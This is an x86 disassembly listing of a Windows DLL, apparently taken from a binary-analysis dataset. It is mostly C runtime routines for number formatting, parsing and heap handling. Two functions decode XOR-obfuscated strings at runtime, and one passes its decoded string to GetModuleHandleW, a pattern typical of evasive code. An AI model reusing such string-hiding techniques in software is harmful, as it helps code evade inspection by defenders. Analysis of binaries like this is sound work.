test ebx ebx
je r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x18 ] 0x0
call sub_10032538
push r--data
lea edx [ ebp - 0x28 ]
push edx
mov [ ebp - 0x28 ] r--data
call sub_10055e2a
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
add ecx 0x18
mov [ ebp - 0x4 ] 0x2
call sub_10007d10
mov [ ebp + 0x8 ] eax
mov eax r-xdata
retn
push ecx
call sub_1002e3ac
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x0
mov [ edi ] eax
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ebx
cmp esi 0x10
jb r-xdata
mov ecx [ edi ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov [ edi + ebx ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edi eax
push ebx
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_1007f580
add esp 0xc
sub_10045d9b
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_10055e2a
int3
mov edx [ esi ]
push edx
call sub_1000a86e
add esp 0x4
sub_10045dd0
mov eax esi
push edi
lea edi [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax edi
sar eax 0x1
mov edi eax
mov eax [ ecx + 0x10 ]
push esi
call sub_100449d0
neg eax
sbb eax eax
inc eax
pop edi
retn
sub_10045df7
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
movzx eax [ ebp + 0x10 ]
movzx edx [ ebp + 0x10 ]
mov ecx 0x8000
and eax ecx
push ebx
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
lea eax [ ecx - 0x1 ]
push esi
and edx eax
cmp [ ebp - 0x60 ] 0x0
push edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x30 ] 0xcccccccc
mov [ ebp - 0x2c ] 0xcccccccc
mov [ ebp - 0x28 ] 0x3ffbcccc
mov [ ebp - 0x74 ] 0x1
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
mov eax esi
shr eax 0x18
shr ebx 0x8
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
mov [ ebp - 0x20 ] cx
movsx ebx ax
mov ecx rw-data
sub ecx 0x60
neg ebx
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x68 ] ecx
je r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp ecx eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
test ebx ebx
jns r-xdata
test ecx 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp - 0x60 ] cx
mov [ ebx ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x3001
mov [ ebx + 0x5 ] 0x0
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x64 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
mov ebx [ ebp - 0x26 ]
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx ax
jae r-xdata
je r-xdata
mov eax rw-data
sub eax 0x60
neg ebx
mov [ ebp - 0x68 ] eax
test ebx ebx
xor edx edx
cmp [ ebp - 0x60 ] dx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x68 ] 0x54
mov ecx ebx
sar ebx 0x3
and ecx 0x7
je r-xdata
cmp ecx eax
jne r-xdata
cmp ecx 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_10042442
add esp 0xc
test eax eax
jne r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x60 ] ax
mov [ edx + 0x3 ] 0x3001
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x68 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1005aa2b
mov [ ebx + 0x3 ] 0x6
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jns r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0xa ]
mov edx ecx
xor edx [ ebp - 0x16 ]
mov esi 0x7fff
and edx 0x8000
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x16 ]
and edx esi
and ecx esi
lea esi [ ecx + edx ]
movzx edi si
mov esi 0x7fff
cmp dx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x58 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp cx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_10042442
add esp 0xc
test eax eax
jne r-xdata
mov al [ ebx - 0x1 ]
sub ebx 0x2
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x54 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
add edi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x58 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x48 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp cx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x60 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jns r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x58 ] 0x2
add eax 0x2
dec [ ebp - 0x48 ]
cmp [ ebp - 0x48 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x54 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x58 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
add esi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x6c ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jns r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x70 ] 0x2
sub [ ebp - 0x6c ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x70 ]
movzx ecx [ eax ]
mov eax [ ebp - 0x6c ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x48 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x48 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x58 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x58 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_10046710
mov eax [ edi + 0x4 ]
dec [ eax ]
jne r-xdata
retn
push ebx
mov ebx [ HeapFree@IAT ]
push esi
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ edi + 0x4 ]
mov [ edi ] 0x0
test eax eax
je r-xdata
mov eax esi
call sub_10054bf0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call ebx
pop esi
mov [ edi + 0x4 ] 0x0
pop ebx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call ebx
sub_10046777
push 0x10
push r--data
call sub_1007fad0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1003a6bb
and [ eax ] 0x0
call sub_1005b670
mov [ eax ] 0x9
call sub_1003a6bb
and [ eax ] 0x0
call sub_1005b670
mov [ eax ] 0x9
call sub_1004b131
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_1007fb15
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_1005fd8b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1005b670
mov [ eax ] 0x9
call sub_1003a6bb
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_10005cc9
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10046843
mov eax [ ebp - 0x1c ]
sub_1004684b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_1002f3c9
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_10046885
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x14
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
mov edi [ ebp + 0x8 ]
movzx eax [ edi ]
mov esi edi
jmp r-xdata
mov [ eax ] ebx
push eax
call sub_10002c6e
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x1 ] al
inc esi
cmp al 0x2b
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax ebx
je r-xdata
cmp eax 0x1
je r-xdata
mov [ ebp - 0x1 ] 0x2b
jmp r-xdata
xor eax eax
mov [ eax ] edi
cmp eax 0x24
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jl r-xdata
mov cl 0x30
cmp eax ebx
jle r-xdata
cmp [ esi ] cl
je r-xdata
cmp eax 0x10
jne r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
cmp [ esi ] cl
jne r-xdata
mov [ ebp + 0x10 ] 0x10
cmp al 0x58
je r-xdata
cmp [ esi ] cl
je r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
inc esi
movsx eax [ esi ]
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ebx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0xc ] ebx
call sub_1006a3ae
pop ecx
push eax
mov edi r--data
push edi
call sub_1007f310
add esp 0xc
cmp eax ebx
je r-xdata
add esi 0x2
cmp al 0x58
jne r-xdata
mov bl [ ebp + 0x13 ]
mov ecx [ ebp - 0x8 ]
push [ ebp + 0x10 ]
mov bl al
mov eax edi
sub bl al
mov eax ecx
imul eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
movsx ecx bl
add eax ecx
mov [ ebp - 0x8 ] eax
inc esi
movsx eax [ esi ]
push eax
call sub_1006a3ae
pop ecx
push eax
push edi
call sub_1007f310
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ ebp + 0x10 ]
movsx edx [ ecx + r--data ]
mov eax esi
sub eax edx
sub eax [ ebp - 0x14 ]
js r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
jmp r-xdata
cmp [ ebp - 0x1 ] 0x2d
jne r-xdata
test eax eax
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
cmp [ ebp - 0x10 ] esi
jne r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
neg [ ebp - 0x8 ]
call sub_1005b670
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
movsx edx bl
sub eax edx
cmp [ ebp - 0x8 ] eax
jb r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov [ eax ] esi
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x1 ] 0x2b
mov [ eax ] 0x1
xor edx edx
div ecx
cmp eax [ ebp - 0xc ]
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_10046a30
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x24 ] 0x0
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffcb
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xc
jb r-xdata
xor eax eax
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x8 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x20 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
push esi
lea edx [ ebp - 0x28 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0x28 ]
mov eax edx
lea esi [ eax + 0x2 ]
jmp r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
lea esi [ edi + 0x5c ]
push edx
mov ecx esi
call sub_10034100
mov ecx [ ebp - 0x28 ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi + 0x10 ]
push r--data
xor edi edi
mov ecx esi
mov [ ebp - 0x24 ] 0x0
call sub_100449d0
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax 0xfffffffe
pop esi
xor ecx ebp
add eax 0x2
pop edi
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10046b30
push esi
mov esi ecx
cmp [ esi + 0xb8 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0xc0 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc4 ]
test eax eax
je r-xdata
push eax
mov eax [ esi + 0xd8 ]
call eax
mov [ esi + 0xc0 ] 0x0
mov ecx [ esi + 0xd8 ]
push eax
call ecx
mov [ esi + 0xc4 ] 0x0
sub_10046b80
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_10046be0
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffec
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0xb
jb r-xdata
lea ecx [ ebp - 0x1c ]
xor eax eax
push ecx
mov [ ebp - 0x6 ] ax
call [ GetModuleHandleW@IAT ]
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
xor ecx ebp
neg eax
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10046c41
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_1001b2d2
push [ esi + 0x8 ]
call sub_1001b2d2
push [ esi + 0xc ]
call sub_1001b2d2
push [ esi + 0x10 ]
call sub_1001b2d2
push [ esi + 0x14 ]
call sub_1001b2d2
push [ esi + 0x18 ]
call sub_1001b2d2
push [ esi ]
call sub_1001b2d2
